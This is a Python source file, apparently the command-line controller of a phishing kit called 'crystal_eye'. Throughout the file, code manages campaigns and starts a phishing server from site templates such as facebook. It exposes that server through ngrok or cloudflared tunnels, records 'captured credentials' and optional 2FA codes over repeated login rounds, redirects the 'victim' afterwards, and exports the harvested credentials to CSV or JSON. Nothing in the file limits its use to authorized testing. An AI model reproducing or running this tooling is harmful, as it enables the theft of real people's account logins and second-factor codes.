from __future__ import annotations

import os
import sys
from typing import TYPE_CHECKING

from rich.table import Table
from rich.panel import Panel

from crystal_eye.display.panels import (
    display_campaigns_table,
    display_config_table,
    display_credentials_table,
)

if TYPE_CHECKING:
    from crystal_eye.repl.shell import CrystalEyeShell

HELP_BRIEF = {
    "setup": "Launch the interactive setup wizard",
    "set": "Change a config value (try 'help set')",
    "show": "Display current configuration",
    "campaign": "Manage campaigns (try 'help campaign')",
    "start": "Start the phishing server",
    "stop": "Stop the running server",
    "creds": "Show captured credentials",
    "export": "Export credentials (csv or json)",
    "clear": "Clear the screen",
    "help": "Show help (detailed with command name)",
    "exit": "Save and quit",
}


class CommandRegistry:
    """Routes command strings to handler methods."""

    def __init__(self, shell: CrystalEyeShell) -> None:
        self.shell = shell
        self._handlers: dict[str, callable] = {
            "setup": self.do_setup,
            "set": self.do_set,
            "show": self.do_show,
            "campaign": self.do_campaign,
            "start": self.do_start,
            "stop": self.do_stop,
            "creds": self.do_creds,
            "export": self.do_export,
            "clear": self.do_clear,
            "help": self.do_help,
            "exit": self.do_exit,
            "quit": self.do_exit,
        }

    def _require_campaign(self) -> bool:
        """Check that a campaign is set and DB is initialized. Prints error if not."""
        if not self.shell.config.campaign or not self.shell.db:
            self.shell.console.print(
                "[red]No campaign set.[/red] Use 'set campaign <name>' or 'setup' first."
            )
            return False
        return True

    def dispatch(self, line: str) -> None:
        if not line:
            return
        parts = line.split()
        cmd = parts[0].lower()
        args = parts[1:]
        handler = self._handlers.get(cmd)
        if handler is None:
            self.shell.console.print(f"[red]Unknown command:[/red] {cmd}. Type 'help' for commands.")
            return
        try:
            handler(*args)
        except TypeError:
            self.shell.console.print(f"[red]Invalid arguments for '{cmd}'.[/red] Type 'help {cmd}'.")

    def do_setup(self) -> None:
        from crystal_eye.repl.wizard import SetupWizard

        wizard = SetupWizard(
            config=self.shell.config,
            shell=self.shell,
            console=self.shell.console,
            template_registry=self.shell.template_registry,
        )
        should_start = wizard.run()
        if should_start:
            self.do_start()

    def do_set(self, key: str = None, *values: str) -> None:
        if key is None:
            self.shell.console.print("[yellow]Usage:[/yellow] set <key> <value>")
            self.shell.console.print("[dim]Type 'help set' to see all available keys.[/dim]")
            return

        if not values:
            self.shell.console.print(f"[yellow]Usage:[/yellow] set {key} <value>")
            return

        value = " ".join(values)
        config = self.shell.config

        if key not in config.SETTABLE_KEYS:
            self.shell.console.print(
                f"[red]Unknown key:[/red] {key}\n"
                f"[dim]Available: {', '.join(sorted(config.SETTABLE_KEYS))}[/dim]"
            )
            return

        # Type coercion and validation
        if key == "port":
            try:
                port = int(value)
                if not (1 <= port <= 65535):
                    raise ValueError
                config.port = port
            except ValueError:
                self.shell.console.print("[red]Port must be 1-65535.[/red]")
                return

        elif key == "max_attempts":
            try:
                config.max_attempts = int(value)
            except ValueError:
                self.shell.console.print("[red]max_attempts must be an integer.[/red]")
                return

        elif key in ("verbose", "use_https", "enable_2fa"):
            bool_val = value.lower() in ("true", "yes", "1", "on")
            setattr(config, key, bool_val)

        elif key == "template":
            manifest = self.shell.template_registry.get(value)
            if manifest is None:
                available = ", ".join(self.shell.template_registry.list_names()) or "none"
                self.shell.console.print(
                    f"[red]Unknown template:[/red] {value}\n"
                    f"[dim]Available: {available}[/dim]"
                )
                return
            config.template = value
            if config.redirect_url is None:
                config.redirect_url = manifest.redirect_url

        elif key == "campaign":
            from crystal_eye.config import get_state_dir

            campaign_dir = get_state_dir() / "campaigns" / value
            if campaign_dir.is_dir():
                config.campaign = value
                self.shell.init_campaign_db()
            else:
                config.campaign = value
                self.shell.init_campaign_db()
                self.shell.console.print(f"[dim]New campaign created: {config.campaign_dir}[/dim]")

        elif key == "tunnel":
            allowed = ("cloudflared", "ngrok", "none", "off")
            if value.lower() not in allowed:
                self.shell.console.print(
                    f"[red]Unknown tunnel provider:[/red] {value}\n"
                    "[dim]Available: cloudflared, ngrok, none[/dim]"
                )
                return
            if value.lower() in ("none", "off"):
                config.tunnel = None
            else:
                config.tunnel = value.lower()

        else:
            setattr(config, key, value)

        self.shell.console.print(f"[green]{key}[/green] = {getattr(config, key)}")

    def do_show(self) -> None:
        display_config_table(self.shell.console, self.shell.config)

    def do_campaign(self, action: str = None, *args: str) -> None:
        if action is None:
            self.shell.console.print("[yellow]Usage:[/yellow] campaign <list|create|delete> [name]")
            self.shell.console.print("[dim]Type 'help campaign' for details.[/dim]")
            return

        action = action.lower()

        if action == "list":
            self._campaign_list()
        elif action == "create":
            self._campaign_create(*args)
        elif action == "delete":
            self._campaign_delete(*args)
        else:
            self.shell.console.print(
                f"[red]Unknown action:[/red] {action}\n"
                "[dim]Available: list, create, delete[/dim]"
            )

    def _campaign_list(self) -> None:
        from crystal_eye.config import get_state_dir
        from crystal_eye.db.engine import Database
        from crystal_eye.db.repository import CampaignRepository, CredentialRepository
        from crystal_eye.db.models import Campaign

        campaigns_root = get_state_dir() / "campaigns"
        if not campaigns_root.is_dir():
            self.shell.console.print("[dim]No campaigns yet. Use 'set campaign <name>' to get started.[/dim]")
            return

        campaigns = []
        cred_counts = {}

        for entry in sorted(campaigns_root.iterdir()):
            db_path = entry / "credentials.db"
            if entry.is_dir() and db_path.exists():
                db = Database(db_path)
                db.connect()
                camp_repo = CampaignRepository(db)
                cred_repo = CredentialRepository(db)
                camp = camp_repo.get_by_name(entry.name)
                if camp:
                    campaigns.append(camp)
                    cred_counts[camp.id] = cred_repo.count_by_campaign(camp.id)
                db.close()

        if not campaigns:
            self.shell.console.print("[dim]No campaigns yet. Use 'set campaign <name>' to get started.[/dim]")
            return

        display_campaigns_table(self.shell.console, campaigns, cred_counts)

    def _campaign_create(self, *args: str) -> None:
        if not args:
            self.shell.console.print("[yellow]Usage:[/yellow] campaign create <name>")
            return

        name = " ".join(args)
        self.shell.config.campaign = name
        self.shell.init_campaign_db()
        self.shell.console.print(
            f"[green]Campaign created:[/green] {name}\n"
            f"[dim]Campaign dir: {self.shell.config.campaign_dir}[/dim]"
        )

    def _campaign_delete(self, *args: str) -> None:
        if not args:
            self.shell.console.print("[yellow]Usage:[/yellow] campaign delete <name>")
            return

        name = " ".join(args)

        from crystal_eye.config import get_state_dir

        campaign_dir = get_state_dir() / "campaigns" / name
        if not campaign_dir.is_dir():
            self.shell.console.print(f"[red]Campaign not found:[/red] {name}")
            return

        try:
            answer = input(f"  Delete campaign '{name}' and all its data? [y/N] ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            self.shell.console.print("\n[dim]Cancelled.[/dim]")
            return

        if answer not in ("y", "yes"):
            self.shell.console.print("[dim]Cancelled.[/dim]")
            return

        if self.shell.config.campaign == name:
            self._stop_tunnel()
            if self.shell.server_runner and self.shell.server_runner.is_running:
                self.shell.server_runner.stop()
                self.shell.server_runner = None
                self.shell.console.print("[yellow]Server stopped.[/yellow]")
            if self.shell.db:
                self.shell.db.close()
                self.shell.db = None
                self.shell.campaign_repo = None
                self.shell.cred_repo = None
            self.shell.config.campaign = None
            self.shell.config._active_campaign_id = None

        import shutil

        shutil.rmtree(campaign_dir)
        self.shell.console.print(f"[green]Deleted campaign:[/green] {name}")

    def do_start(self) -> None:
        if self.shell.server_runner and self.shell.server_runner.is_running:
            self.shell.console.print("[yellow]Server is already running.[/yellow] Use 'stop' first.")
            return

        config = self.shell.config
        if not config.is_ready():
            missing = []
            if not config.template:
                missing.append("template")
            if not config.campaign:
                missing.append("campaign")
            self.shell.console.print(
                f"[red]Cannot start:[/red] missing {', '.join(missing)}.\n"
                "[dim]Use 'setup' or 'set' to configure.[/dim]"
            )
            return

        # Tunnel handles TLS — force local HTTPS off to avoid cert issues
        if config.tunnel and config.use_https:
            config.use_https = False
            self.shell.console.print("[dim]HTTPS disabled (tunnel handles TLS).[/dim]")

        if not self._require_campaign():
            return

        campaign = self.shell.campaign_repo.get_by_name(config.campaign)
        if campaign is None:
            campaign = self.shell.campaign_repo.create(config.campaign, config.template)
        config._active_campaign_id = campaign.id

        manifest = self.shell.template_registry.get(config.template)
        template_dir = self.shell.template_registry.get_template_dir(config.template)

        from crystal_eye.server.runner import ServerRunner

        self.shell.server_runner = ServerRunner(
            config=config,
            template_manifest=manifest,
            template_dir=template_dir,
            on_credential=self.shell.on_credential_captured,
        )

        try:
            self.shell.server_runner.start()
        except OSError as e:
            self.shell.console.print(f"[red]Failed to start server:[/red] {e}")
            self.shell.server_runner = None
            return

        protocol = "https" if config.use_https else "http"
        self.shell.console.print(
            f"\n[green]Server started on {protocol}://{config.host}:{config.port}[/green]"
        )

        # Start tunnel if configured
        if config.tunnel:
            self._start_tunnel(config)
        else:
            self.shell.console.print("[dim]Waiting for connections...[/dim]\n")

    def _start_tunnel(self, config) -> None:
        """Start a tunnel provider and display the public URL."""
        from crystal_eye.tunnel.cloudflared import CloudflaredTunnel
        from crystal_eye.tunnel.ngrok import NgrokTunnel

        providers = {
            "cloudflared": CloudflaredTunnel,
            "ngrok": NgrokTunnel,
        }

        cls = providers.get(config.tunnel)
        if cls is None:
            self.shell.console.print(f"[red]Unknown tunnel provider:[/red] {config.tunnel}")
            return

        tunnel = cls()
        if not tunnel.is_installed():
            self.shell.console.print(
                "[red]cloudflared is not installed.[/red]\n"
                "[dim]Install it:[/dim]\n"
                "  [dim]Arch:[/dim]   sudo pacman -S cloudflared\n"
                "  [dim]macOS:[/dim]  brew install cloudflare/cloudflare/cloudflared\n"
                "  [dim]Debian:[/dim] curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -o cloudflared.deb && sudo dpkg -i cloudflared.deb\n"
                "  [dim]Other:[/dim]  https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
            )
            return

        # ngrok requires an auth token
        if config.tunnel == "ngrok" and not config.token:
            self.shell.console.print(
                "[red]ngrok token not set.[/red] "
                "Run: [bold]set token <your-ngrok-token>[/bold]\n"
                "[dim]Sign up at https://ngrok.com to get your token.[/dim]"
            )
            return

        self.shell.console.print(f"[dim]Starting {tunnel.name} tunnel...[/dim]")

        try:
            protocol = "https" if config.use_https else "http"
            public_url = tunnel.start(config.port, protocol, auth_token=config.token)
            self.shell.tunnel = tunnel
            self.shell.console.print(
                f"[green]Tunnel active:[/green] [bold]{public_url}[/bold]\n"
            )
        except RuntimeError as e:
            self.shell.console.print(f"[red]Tunnel failed:[/red] {e}")
            self.shell.console.print("[dim]Server is still running locally.[/dim]\n")

    def _stop_tunnel(self) -> None:
        """Stop the tunnel if running."""
        if self.shell.tunnel and self.shell.tunnel.is_running:
            self.shell.tunnel.stop()
            self.shell.tunnel = None
            self.shell.console.print("[yellow]Tunnel stopped.[/yellow]")

    def do_stop(self) -> None:
        if not self.shell.server_runner or not self.shell.server_runner.is_running:
            self.shell.console.print("[yellow]No server is running.[/yellow]")
            return

        self._stop_tunnel()
        self.shell.server_runner.stop()
        self.shell.server_runner = None
        self.shell.console.print("[yellow]Server stopped.[/yellow]")

        config = self.shell.config
        if config._active_campaign_id is not None and self.shell.campaign_repo:
            self.shell.campaign_repo.deactivate(config._active_campaign_id)
            config._active_campaign_id = None

    def do_creds(self) -> None:
        if not self._require_campaign():
            return
        campaign = self.shell.campaign_repo.get_by_name(self.shell.config.campaign)
        if campaign:
            creds = self.shell.cred_repo.get_by_campaign(campaign.id)
        else:
            creds = self.shell.cred_repo.get_all()
        display_credentials_table(self.shell.console, creds)

    def do_export(self, fmt: str = None) -> None:
        if fmt is None:
            self.shell.console.print("[yellow]Usage:[/yellow] export <csv|json>")
            return

        if not self._require_campaign():
            return

        if fmt not in ("csv", "json"):
            self.shell.console.print("[red]Format must be 'csv' or 'json'.[/red]")
            return

        from crystal_eye.export.exporter import Exporter

        exporter = Exporter(self.shell.cred_repo, self.shell.campaign_repo)
        exports_dir = self.shell.config.exports_dir
        campaign_name = self.shell.config.campaign

        if fmt == "csv":
            path = exporter.to_csv(campaign_name, exports_dir / f"{campaign_name}.csv")
        else:
            path = exporter.to_json(campaign_name, exports_dir / f"{campaign_name}.json")

        self.shell.console.print(f"[green]Exported to:[/green] {path.resolve()}")

    def do_clear(self) -> None:
        os.system("clear" if os.name != "nt" else "cls")

    def _help_table(self, rows: list[tuple[str, str]], title: str) -> None:
        """Render a help table inside a cyan panel."""
        table = Table(
            show_header=False,
            show_edge=False,
            box=None,
            padding=(0, 2),
            expand=True,
        )
        table.add_column("Command", style="bold cyan", no_wrap=True, width=20)
        table.add_column("Description")

        for cmd, desc in rows:
            table.add_row(cmd, desc)

        self.shell.console.print()
        self.shell.console.print(Panel(table, title=f"[bold]{title}[/bold]", border_style="cyan", expand=True))

    def do_help(self, command: str = None) -> None:
        if command:
            handler = {
                "set": self._help_set,
                "campaign": self._help_campaign,
                "export": self._help_export,
            }.get(command)

            if handler:
                handler()
            elif command in HELP_BRIEF:
                self._help_table(
                    [(command, HELP_BRIEF[command])],
                    title=command,
                )
            else:
                self.shell.console.print(f"[red]Unknown command:[/red] {command}")
            return

        self._help_table(
            [
                ("setup", "Launch the interactive setup wizard"),
                ("set <key> <value>", "Change a config value (try 'help set')"),
                ("show", "Display current configuration"),
                ("", ""),
                ("campaign list", "List all campaigns with stats"),
                ("campaign create <name>", "Create a new campaign"),
                ("campaign delete <name>", "Delete a campaign and all its data"),
                ("", ""),
                ("start", "Start the phishing server"),
                ("stop", "Stop the running server"),
                ("creds", "Show captured credentials"),
                ("export <csv|json>", "Export credentials to a file"),
                ("", ""),
                ("clear", "Clear the screen"),
                ("help [command]", "Detailed help for a command"),
                ("exit", "Save and quit"),
            ],
            title="Commands",
        )

    def _help_set(self) -> None:
        self._help_table(
            [
                ("campaign", "Set or create a campaign by name"),
                ("template", "Phishing template to use (e.g. facebook)"),
                ("tunnel", "Tunnel provider (cloudflared, ngrok, none)"),
                ("token", "Auth token for ngrok"),
                ("port", "Server port (default: 8080)"),
                ("host", "Listen address (default: 0.0.0.0)"),
                ("max_attempts", "Login rounds before redirect (default: 2)"),
                ("redirect_url", "Where to send victim after capture"),
                ("enable_2fa", "Capture 2FA codes (true/false)"),
                ("use_https", "HTTPS with self-signed cert (true/false)"),
                ("verbose", "Verbose logging (true/false)"),
            ],
            title="set <key> <value>",
        )

    def _help_campaign(self) -> None:
        self._help_table(
            [
                ("campaign list", "List all campaigns with stats"),
                ("campaign create <name>", "Create a new campaign"),
                ("campaign delete <name>", "Delete a campaign and all its data"),
            ],
            title="campaign",
        )

    def _help_export(self) -> None:
        self._help_table(
            [
                ("export csv", "Export credentials as CSV"),
                ("export json", "Export credentials as JSON"),
            ],
            title="export <format>",
        )

    def do_exit(self) -> None:
        self._stop_tunnel()
        if self.shell.server_runner and self.shell.server_runner.is_running:
            self.shell.server_runner.stop()
            self.shell.console.print("[yellow]Server stopped.[/yellow]")

        self.shell.config.save()
        if self.shell.db:
            self.shell.db.close()
        self.shell.console.print("[dim]Goodbye.[/dim]")
        sys.exit(0)
